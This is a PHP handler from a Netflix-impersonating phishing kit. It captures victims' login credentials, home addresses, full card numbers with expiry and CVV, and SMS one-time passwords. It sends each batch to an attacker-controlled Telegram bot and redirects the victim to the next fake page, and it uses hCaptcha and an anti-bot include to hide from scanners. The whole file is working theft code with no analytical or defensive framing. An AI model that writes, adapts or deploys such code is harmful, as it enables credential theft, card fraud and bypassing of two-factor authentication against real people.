<?php 
session_start();
require 'config.php';
require 'botMother/botMother.php';

$bm = new botMother();


function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}



$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['user'])){

$captchaResponse = $_POST['h-captcha-response'] ?? '';

$captchaSecret = "ES_c2e6eff9a7644bae93f860ec1e530f92"; // Replace with your hCaptcha secret key

if (empty($captchaResponse)) {
    echo "Error: Captcha not completed.";
    exit;
}

// Validate captcha response
$verifyCaptcha = curl_init();
curl_setopt($verifyCaptcha, CURLOPT_URL, "https://hcaptcha.com/siteverify");
curl_setopt($verifyCaptcha, CURLOPT_POST, true);
curl_setopt($verifyCaptcha, CURLOPT_POSTFIELDS, http_build_query([
    'secret' => $captchaSecret,
    'response' => $captchaResponse,
]));
curl_setopt($verifyCaptcha, CURLOPT_RETURNTRANSFER, true);
$responseData = json_decode(curl_exec($verifyCaptcha));
curl_close($verifyCaptcha);

if (!$responseData || !$responseData->success) {
    echo "Error: Invalid captcha.";
    exit;
}

$msg = "
NETFLIX- New Log 
--------------------------
User: ".$_POST['user']."
pass: ".$_POST['pass']."
--------------------------
IP: $ip
";

sendTotelegram($msg);
header("location: adrees.php");
exit;

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['first-name'])){
$_SESSION['_first-name'] = $_POST['first-name'];
$msg = "
NETFLIX- New ads
--------------------------
Name: ".$_POST['name']."
first-name: ".$_POST['first-name']."
last-name: ".$_POST['last-name']."
address-line-1: ".$_POST['address-line-1']."
address-line-2: ".$_POST['address-line-2']."
phoneNumber: ".$_POST['phoneNumber']."
country: ".$_POST['country']."
city: ".$_POST['city']."
postal-code: ".$_POST['postal-code']."
--------------------------
IP: $ip
";


sendTotelegram($msg);

header("location: card.php");

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['cc'])){
$_SESSION['_cc'] = $_POST['cc'];
$msg = "
NETFLIX- New CC 
--------------------------
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
holder-name: ".$_POST['holder-name']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: wait.php?next=sms.php");
    
}
    


if(isset($_POST['otp'])){

$msg = "
NETFLIX - New OTP
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['otp']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: wait.php?next=sms.php?error");

}
    

if(@$msg!=""){
    $bm->logTXT($msg);
}



?>